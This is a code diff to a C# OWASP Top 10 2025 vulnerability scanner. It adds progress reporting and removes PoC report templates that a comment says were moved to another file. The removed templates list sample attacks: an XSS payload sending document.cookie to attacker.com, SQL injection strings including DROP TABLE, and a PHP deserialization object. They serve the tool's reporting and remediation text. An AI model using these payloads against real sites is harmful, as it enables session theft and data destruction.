@@ -14,7 +14,7 @@ namespace WebTrafficInspector.Services
     /// Comprehensive OWASP Top 10 2025 Vulnerability Scanner
     /// Automatically tests all entered/crawled URLs for all 10 OWASP categories
     /// </summary>
-    public class OWASPT10_2025_ScannerService
+    public partial class OWASPT10_2025_ScannerService
     {
         private readonly HttpClient _httpClient;
         private Dictionary<string, OWASPT10ScanReport> _scanResults;
@@ -46,57 +46,57 @@ namespace WebTrafficInspector.Services
                 OriginalResponse = originalEntry?.RawResponse
             };
 
-            OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Starting OWASP Top 10 2025 scan..." });
+            OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Starting OWASP Top 10 2025 scan...", CurrentCategory = "Initialization", Message = "Starting OWASP Top 10 2025 scan...", ProgressPercentage = 0 });
 
             try
             {
                 // A01:2025 - Broken Access Control
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A01: Broken Access Control..." });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A01: Broken Access Control...", CurrentCategory = "A01: Broken Access Control", Message = "Testing A01: Broken Access Control...", ProgressPercentage = 10 });
                 var a01Results = await TestBrokenAccessControl(url, originalEntry);
                 report.VulnerabilitiesByCategory["A01:2025 - Broken Access Control"] = a01Results;
 
                 // A02:2025 - Security Misconfiguration
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A02: Security Misconfiguration..." });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A02: Security Misconfiguration...", CurrentCategory = "A02: Security Misconfiguration", Message = "Testing A02: Security Misconfiguration...", ProgressPercentage = 20 });
                 var a02Results = await TestSecurityMisconfiguration(url, originalEntry);
                 report.VulnerabilitiesByCategory["A02:2025 - Security Misconfiguration"] = a02Results;
 
                 // A03:2025 - Software Supply Chain Failures
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A03: Software Supply Chain Failures..." });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A03: Software Supply Chain Failures...", CurrentCategory = "A03: Software Supply Chain Failures", Message = "Testing A03: Software Supply Chain Failures...", ProgressPercentage = 30 });
                 var a03Results = await TestSupplyChainFailures(url, originalEntry);
                 report.VulnerabilitiesByCategory["A03:2025 - Software Supply Chain Failures"] = a03Results;
 
                 // A04:2025 - Cryptographic Failures
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A04: Cryptographic Failures..." });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A04: Cryptographic Failures...", CurrentCategory = "A04: Cryptographic Failures", Message = "Testing A04: Cryptographic Failures...", ProgressPercentage = 40 });
                 var a04Results = await TestCryptographicFailures(url, originalEntry);
                 report.VulnerabilitiesByCategory["A04:2025 - Cryptographic Failures"] = a04Results;
 
                 // A05:2025 - Injection
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A05: Injection..." });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A05: Injection...", CurrentCategory = "A05: Injection", Message = "Testing A05: Injection...", ProgressPercentage = 50 });
                 var a05Results = await TestInjection(url, originalEntry);
                 report.VulnerabilitiesByCategory["A05:2025 - Injection"] = a05Results;
 
                 // A06:2025 - Insecure Design
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A06: Insecure Design..." });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A06: Insecure Design...", CurrentCategory = "A06: Insecure Design", Message = "Testing A06: Insecure Design...", ProgressPercentage = 60 });
                 var a06Results = await TestInsecureDesign(url, originalEntry);
                 report.VulnerabilitiesByCategory["A06:2025 - Insecure Design"] = a06Results;
 
                 // A07:2025 - Authentication Failures
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A07: Authentication Failures..." });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A07: Authentication Failures...", CurrentCategory = "A07: Authentication Failures", Message = "Testing A07: Authentication Failures...", ProgressPercentage = 70 });
                 var a07Results = await TestAuthenticationFailures(url, originalEntry);
                 report.VulnerabilitiesByCategory["A07:2025 - Authentication Failures"] = a07Results;
 
                 // A08:2025 - Software or Data Integrity Failures
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A08: Data Integrity Failures..." });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A08: Data Integrity Failures...", CurrentCategory = "A08: Data Integrity Failures", Message = "Testing A08: Data Integrity Failures...", ProgressPercentage = 80 });
                 var a08Results = await TestIntegrityFailures(url, originalEntry);
                 report.VulnerabilitiesByCategory["A08:2025 - Software or Data Integrity Failures"] = a08Results;
 
                 // A09:2025 - Logging & Alerting Failures
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A09: Logging & Alerting Failures..." });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A09: Logging & Alerting Failures...", CurrentCategory = "A09: Logging & Alerting Failures", Message = "Testing A09: Logging & Alerting Failures...", ProgressPercentage = 90 });
                 var a09Results = await TestLoggingFailures(url, originalEntry);
                 report.VulnerabilitiesByCategory["A09:2025 - Logging & Alerting Failures"] = a09Results;
 
                 // A10:2025 - Mishandling of Exceptional Conditions
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A10: Exceptional Conditions..." });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = "Testing A10: Exceptional Conditions...", CurrentCategory = "A10: Exceptional Conditions", Message = "Testing A10: Exceptional Conditions...", ProgressPercentage = 95 });
                 var a10Results = await TestExceptionalConditions(url, originalEntry);
                 report.VulnerabilitiesByCategory["A10:2025 - Mishandling of Exceptional Conditions"] = a10Results;
 
@@ -105,7 +105,7 @@ namespace WebTrafficInspector.Services
                 report.TotalVulnerabilitiesFound = report.VulnerabilitiesByCategory.Values.Sum(v => v.Count);
 
                 _scanResults[url] = report;
-                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = $"Scan complete! Found {report.TotalVulnerabilitiesFound} vulnerability(ies)" });
+                OnScanProgress(new OWASPT10ScanProgressEventArgs { Url = url, Status = $"Scan complete! Found {report.TotalVulnerabilitiesFound} vulnerability(ies)", CurrentCategory = "Complete", Message = $"Scan complete! Found {report.TotalVulnerabilitiesFound} vulnerability(ies)", ProgressPercentage = 100 });
             }
             catch (Exception ex)
             {
@@ -152,7 +152,7 @@ namespace WebTrafficInspector.Services
                                 TestRequest = result.Request,
                                 TestResponse = result.Response,
                                 Evidence = $"Successfully accessed resource with {param}={testValue}",
-                                PoC = GenerateIDORPoC(url, param, testValue, result.Response),
+                                PoC = GenerateIDORPoC(testUrl, testValue, param),
                                 CWE = "CWE-639"
                             });
                         }
@@ -354,7 +354,7 @@ namespace WebTrafficInspector.Services
                             TestRequest = result.Request,
                             TestResponse = result.Response,
                             Evidence = $"Found reference to '{lib.Key}' in response",
-                            PoC = GenerateVulnerableComponentPoC(lib.Key, lib.Value),
+                            PoC = GenerateVulnerableComponentPoC(lib.Key, lib.Value, "Vulnerable component detected"),
                             CWE = "CWE-1104"
                         });
                     }
@@ -453,7 +453,7 @@ namespace WebTrafficInspector.Services
                         TestRequest = result.Request,
                         TestResponse = result.Response,
                         Evidence = "Weak algorithm reference detected in response",
-                        PoC = GenerateWeakCryptoPoC(),
+                        PoC = GenerateWeakCryptoPoC("Weak cryptographic algorithm"),
                         CWE = "CWE-327"
                     });
                 }
@@ -515,7 +515,7 @@ namespace WebTrafficInspector.Services
                         var testUrl = ReplaceParameter(url, param, payload);
                         var result = await TestRequest(testUrl, "GET");
 
-                        if (IsSQL InjectionVulnerable(result.Response))
+                        if (IsSQLInjectionVulnerable(result.Response))
                         {
                             vulnerabilities.Add(new OWASPT10Vulnerability
                             {
@@ -527,7 +527,7 @@ namespace WebTrafficInspector.Services
                                 TestRequest = result.Request,
                                 TestResponse = result.Response,
                                 Evidence = $"SQL error or unexpected behavior with payload: {payload}",
-                                PoC = GenerateSQLInjectionPoC(url, param, payload, result.Response),
+                                PoC = GenerateSQLInjectionPoC(url, payload, "GET"),
                                 CWE = "CWE-89"
                             });
                             break; // Found vulnerability for this parameter
@@ -555,7 +555,7 @@ namespace WebTrafficInspector.Services
                                 TestRequest = result.Request,
                                 TestResponse = result.Response,
                                 Evidence = $"Payload reflected without sanitization: {payload}",
-                                PoC = GenerateXSSPoC(url, param, payload),
+                                PoC = GenerateXSSPoC(url, payload, "standard"),
                                 CWE = "CWE-79"
                             });
                             break;
@@ -583,7 +583,7 @@ namespace WebTrafficInspector.Services
                                 TestRequest = result.Request,
                                 TestResponse = result.Response,
                                 Evidence = $"Command execution detected with payload: {payload}",
-                                PoC = GenerateCommandInjectionPoC(url, param, payload),
+                                PoC = GenerateCommandInjectionPoC(url, payload),
                                 CWE = "CWE-78"
                             });
                             break;
@@ -1127,6 +1127,9 @@ namespace WebTrafficInspector.Services
 
         public Dictionary<string, OWASPT10ScanReport> GetAllScanResults()
         {
+            if (_scanResults == null)
+                return new Dictionary<string, OWASPT10ScanReport>();
+            
             return new Dictionary<string, OWASPT10ScanReport>(_scanResults);
         }
 
@@ -1142,326 +1145,16 @@ namespace WebTrafficInspector.Services
 
         #endregion
 
-        #region PoC Generators - Continued in next part due to length
+        #region Public Methods
 
-        private string GenerateIDORPoC(string url, string param, string value, string response)
+        public void ClearAllResults()
         {
-            return $@"IDOR Vulnerability PoC:
-
-1. Original Request:
-   GET {url}
-
-2. Malicious Request:
-   GET {AddOrModifyParameter(url, param, value)}
-
-3. Exploitation:
-   - Modify '{param}' parameter to access unauthorized resources
-   - Try values: 1, 2, admin, ../1, etc.
-   - Example: {param}={value}
-
-4. Impact:
-   - Unauthorized access to other users' data
-   - Data breach
-   - Privacy violation
-
-5. Remediation:
-   - Implement proper authorization checks
-   - Verify user owns the requested resource
-   - Use indirect references (random IDs)";
+            _scanResults.Clear();
         }
 
-        private string GenerateAccessControlPoC(string url, string response)
-        {
-            return $@"Missing Function Level Access Control PoC:
+        #endregion
 
-1. Request:
-   GET {url}
-
-2. Exploitation:
-   - Admin interface accessible without authentication
-   - Navigate directly to: {url}
-   - No authorization check performed
-
-3. Impact:
-   - Full administrative access
-   - System compromise
-   - Data manipulation
-
-4. Remediation:
-   - Implement authentication for admin paths
-   - Add role-based access control (RBAC)
-   - Use middleware/guards to protect routes";
-        }
-
-        private string GeneratePathTraversalPoC(string url, string payload)
-        {
-            return $@"Path Traversal PoC:
-
-1. Malicious Request:
-   GET {url}{payload}admin
-
-2. Exploitation:
-   - Use path traversal sequences: {payload}
-   - Bypass access control restrictions
-   - Access restricted directories
-
-3. Impact:
-   - Unauthorized file access
-   - Security bypass
-   - Information disclosure
-
-4. Remediation:
-   - Validate and sanitize file paths
-   - Use whitelist of allowed paths
-   - Implement proper access controls";
-        }
-
-        private string GenerateSecurityHeaderPoC(string header, string description)
-        {
-            return $@"Missing Security Header PoC:
-
-Header: {header} ({description})
-
-Impact:
-   - Without {header}, application is vulnerable to specific attacks
-   - {description} protection is disabled
-
-Remediation:
-   Add the following header to all responses:
-   {header}: [appropriate value]
-
-Example configurations:
-   - Strict-Transport-Security: max-age=31536000; includeSubDomains
-   - X-Frame-Options: DENY
-   - X-Content-Type-Options: nosniff
-   - Content-Security-Policy: default-src 'self'";
-        }
-
-        private string GenerateVerboseErrorPoC(string url)
-        {
-            return $@"Verbose Error Messages PoC:
-
-Test URL: {url}
-
-Exploitation:
-   - Trigger errors by sending invalid input
-   - Stack traces reveal:
-     * Application structure
-     * File paths
-     * Database information
-     * Framework details
-
-Impact:
-   - Information disclosure
-   - Easier exploitation of other vulnerabilities
-   - Reconnaissance for attackers
-
-Remediation:
-   - Use generic error messages in production
-   - Log detailed errors server-side only
-   - Implement custom error pages";
-        }
-
-        private string GenerateDirectoryListingPoC(string url)
-        {
-            return $@"Directory Listing PoC:
-
-URL: {url}
-
-Exploitation:
-   - Browse to directory URL
-   - View all files and subdirectories
-   - Download sensitive files
-
-Impact:
-   - Information disclosure
-   - Access to backup files
-   - Exposure of configuration files
-
-Remediation:
-   - Disable directory listing in web server
-   - Add index.html to all directories
-   - Configure Options -Indexes (Apache)";
-        }
-
-        private string GenerateVulnerableComponentPoC(string component, string description)
-        {
-            return $@"Vulnerable Component PoC:
-
-Component: {component}
-Issue: {description}
-
-Exploitation:
-   - Application uses outdated library
-   - Known CVEs exist for this version
-   - Public exploits available
-
-Impact:
-   - Remote code execution (possible)
-   - XSS vulnerabilities
-   - Security bypass
-
-Remediation:
-   - Update to latest version
-   - Review CVE databases
-   - Implement dependency scanning";
-        }
-
-        private string GenerateCDNInsecurePoC()
-        {
-            return $@"Insecure CDN Resource PoC:
-
-Issue: Loading resources over HTTP from CDN
-
-Exploitation:
-   - Man-in-the-middle attack
-   - Replace legitimate library with malicious code
-   - Inject malware into application
-
-Impact:
-   - Complete application compromise
-   - User data theft
-   - Malware distribution
-
-Remediation:
-   - Use HTTPS for all CDN resources
-   - Implement Subresource Integrity (SRI)
-   - Host critical libraries locally";
-        }
-
-        private string GenerateHTTPPoC(string url)
-        {
-            return $@"Unencrypted Communication PoC:
-
-URL: {url}
-
-Exploitation:
-   - Traffic sent over unencrypted HTTP
-   - Man-in-the-middle attack possible
-   - Passive eavesdropping
-
-Impact:
-   - Credentials exposed
-   - Session tokens stolen
-   - Sensitive data intercepted
-
-Remediation:
-   - Implement HTTPS (SSL/TLS)
-   - Redirect HTTP to HTTPS
-   - Enable HSTS header";
-        }
-
-        private string GenerateSensitiveDataPoC(string url, string pattern)
-        {
-            return $@"Sensitive Data in URL PoC:
-
-URL: {url}
-Sensitive Parameter: {pattern}
-
-Exploitation:
-   - Sensitive data visible in URL
-   - Logged in browser history
-   - Stored in proxy logs
-   - Visible in referrer headers
-
-Impact:
-   - Credential exposure
-   - Token leakage
-   - Privacy violation
-
-Remediation:
-   - Use POST instead of GET for sensitive data
-   - Never put credentials in URLs
-   - Encrypt sensitive parameters";
-        }
-
-        private string GenerateWeakCryptoPoC()
-        {
-            return $@"Weak Cryptographic Algorithm PoC:
-
-Issue: Application uses MD5/SHA1/DES
-
-Exploitation:
-   - Hash collisions possible
-   - Brute force attacks feasible
-   - Weak encryption easily broken
-
-Impact:
-   - Password hashes cracked
-   - Encrypted data decrypted
-   - Integrity bypass
-
-Remediation:
-   - Use SHA-256 or bcrypt for hashing
-   - Use AES-256 for encryption
-   - Implement proper key management";
-        }
-
-        private string GenerateSQLInjectionPoC(string url, string param, string payload, string response)
-        {
-            return $@"SQL Injection PoC:
-
-Parameter: {param}
-Payload: {payload}
-
-Malicious Request:
-   GET {ReplaceParameter(url, param, payload)}
-
-Exploitation:
-   1. Inject SQL payload in '{param}' parameter
-   2. Manipulate database queries
-   3. Extract sensitive data
-
-Example Payloads:
-   - ' OR '1'='1
-   - ' UNION SELECT username, password FROM users--
-   - '; DROP TABLE users--
-
-Impact:
-   - Complete database access
-   - Data theft
-   - Data modification/deletion
-   - Authentication bypass
-
-Remediation:
-   - Use parameterized queries
-   - Implement ORM
-   - Input validation
-   - Least privilege database access";
-        }
-
-        private string GenerateXSSPoC(string url, string param, string payload)
-        {
-            return $@"Cross-Site Scripting (XSS) PoC:
-
-Parameter: {param}
-Payload: {payload}
-
-Malicious Request:
-   GET {ReplaceParameter(url, param, HttpUtility.UrlEncode(payload))}
-
-Exploitation:
-   1. Inject JavaScript in '{param}' parameter
-   2. Payload executes in victim's browser
-   3. Steal cookies, session tokens, perform actions
-
-Example Payloads:
-   - <script>alert(document.cookie)</script>
-   - <img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
-   - <svg onload=alert('XSS')>
-
-Impact:
-   - Session hijacking
-   - Credential theft
-   - Phishing attacks
-   - Malware distribution
-
-Remediation:
-   - HTML encode all output
-   - Implement Content Security Policy
-   - Use HTTPOnly cookies
-   - Input validation";
-        }
+        #region PoC Generation Methods
 
         private string GenerateCommandInjectionPoC(string url, string param, string payload)
         {
@@ -1497,249 +1190,8 @@ Remediation:
    - Principle of least privilege";
         }
 
-        private string GenerateRateLimitPoC(string url)
-        {
-            return $@"Missing Rate Limiting PoC:
-
-URL: {url}
-
-Exploitation:
-   - Send unlimited requests
-   - No throttling mechanism
-   - Brute force attacks possible
-
-Impact:
-   - Denial of Service (DoS)
-   - Resource exhaustion
-   - Brute force attacks
-   - API abuse
-
-Remediation:
-   - Implement rate limiting
-   - Use sliding window algorithm
-   - Add CAPTCHA for sensitive operations
-   - Monitor for abuse patterns";
-        }
-
-        private string GenerateBusinessLogicPoC(string url, string param)
-        {
-            return $@"Business Logic Flaw PoC:
-
-Parameter: {param}
-Issue: Accepts negative values
-
-Malicious Request:
-   GET {ReplaceParameter(url, param, "-1")}
-
-Exploitation:
-   - Set quantity/price to negative value
-   - Receive money instead of paying
-   - Manipulate business logic
-
-Impact:
-   - Financial loss
-   - Inventory manipulation
-   - Fraud
-
-Remediation:
-   - Validate business logic constraints
-   - Implement server-side validation
-   - Use positive integers for quantities/prices
-   - Add transaction integrity checks";
-        }
-
-        private string GenerateWeakCredentialsPoC(string url, string username, string password)
-        {
-            return $@"Weak Default Credentials PoC:
-
-Credentials: {username}/{password}
-
-Exploitation:
-   POST {url}
-   Content: username={username}&password={password}
-
-Impact:
-   - Unauthorized access
-   - Account takeover
-   - System compromise
-
-Remediation:
-   - Force password change on first login
-   - No default credentials in production
-   - Implement strong password policy
-   - Multi-factor authentication";
-        }
-
-        private string GenerateSessionFixationPoC(string url, string sessionId)
-        {
-            return $@"Session Fixation PoC:
-
-Issue: Session ID not regenerated after login
-
-Exploitation:
-   1. Attacker gets session ID: {sessionId}
-   2. Victim logs in with same session
-   3. Attacker uses same session ID to access account
-
-Impact:
-   - Account hijacking
-   - Unauthorized access
-   - Session stealing
-
-Remediation:
-   - Regenerate session ID after authentication
-   - Use secure session management
-   - Implement session timeout";
-        }
-
-        private string GenerateBruteForcePoC(string url)
-        {
-            return $@"Missing Brute Force Protection PoC:
-
-URL: {url}
-
-Exploitation:
-   - Send unlimited login attempts
-   - No account lockout
-   - No CAPTCHA
-   - Automated password guessing
-
-Impact:
-   - Account compromise
-   - Credential stuffing
-   - Unauthorized access
-
-Remediation:
-   - Implement account lockout
-   - Add CAPTCHA after failed attempts
-   - Rate limiting
-   - Multi-factor authentication";
-        }
-
-        private string GenerateSRIPoC()
-        {
-            return $@"Missing Subresource Integrity PoC:
-
-Issue: External scripts loaded without integrity check
-
-Exploitation:
-   - If CDN compromised, malicious code injected
-   - No verification of resource integrity
-   - Supply chain attack
-
-Impact:
-   - Code injection
-   - Application compromise
-   - User data theft
-
-Remediation:
-   Add integrity attribute to script/link tags:
-   <script src='https://cdn.com/lib.js'
-           integrity='sha384-HASH'
-           crossorigin='anonymous'></script>";
-        }
-
-        private string GenerateDeserializationPoC(string url)
-        {
-            return $@"Insecure Deserialization PoC:
-
-URL: {url}
-
-Exploitation:
-   - Inject malicious serialized objects
-   - Remote code execution possible
-   - Application compromise
-
-Example Payloads:
-   - PHP: O:8:""stdClass"":1:{{s:4:""code"";s:10:""phpinfo();"";}}
-   - Java: rO0ABXNy... (serialized exploit)
-   - .NET: Binary formatted malicious object
-
-Impact:
-   - Remote code execution
-   - Authentication bypass
-   - Privilege escalation
-
-Remediation:
-   - Avoid deserializing untrusted data
-   - Use JSON instead of binary serialization
-   - Implement integrity checks
-   - Whitelist allowed classes";
-        }
-
-        private string GenerateLoggingPoC()
-        {
-            return $@"Insufficient Security Logging PoC:
-
-Issue: Security events not properly logged
-
-Missing Logs:
-   - Failed login attempts
-   - Access control failures
-   - Input validation failures
-   - SQL injection attempts
-   - Authentication events
-
-Impact:
-   - Delayed incident detection
-   - Insufficient forensics
-   - Compliance violations
-   - Cannot track attackers
-
-Remediation:
-   - Log all security-relevant events
-   - Implement centralized logging
-   - Set up alerting
-   - Include: timestamp, user, IP, action, result";
-        }
-
-        private string GenerateExceptionHandlingPoC(string url)
-        {
-            return $@"Unhandled Exception PoC:
-
-URL: {url}
-
-Exploitation:
-   - Send malformed input
-   - Trigger unhandled exceptions
-   - Expose stack traces
-   - Information disclosure
-
-Impact:
-   - Application crash
-   - Information leak
-   - Denial of Service
-   - Debugging information exposed
-
-Remediation:
-   - Implement proper exception handling
-   - Use try-catch blocks
-   - Return generic error messages
-   - Log errors securely";
-        }
-
-        private string GenerateNullExceptionPoC(string url)
-        {
-            return $@"Null Reference Exception PoC:
-
-URL: {url}
-
-Exploitation:
-   - Send null/empty values
-   - Trigger NullReferenceException
-   - Application crash
-
-Impact:
-   - Denial of Service
-   - Application instability
-   - Information disclosure
-
-Remediation:
-   - Check for null values
-   - Use null-coalescing operators
-   - Implement input validation
-   - Defensive programming";
-        }
+        // Note: Other PoC generation methods have been moved to OWASPT10_PoCGenerators_Enhanced.cs
+        // to avoid duplication and maintain cleaner code organization
 
         #endregion
     }
@@ -1792,6 +1244,9 @@ Remediation:
     {
         public string Url { get; set; }
         public string Status { get; set; }
+        public string CurrentCategory { get; set; }
+        public string Message { get; set; }
+        public double ProgressPercentage { get; set; }
     }
 
     public class OWASPT10VulnerabilityFoundEventArgs : EventArgs
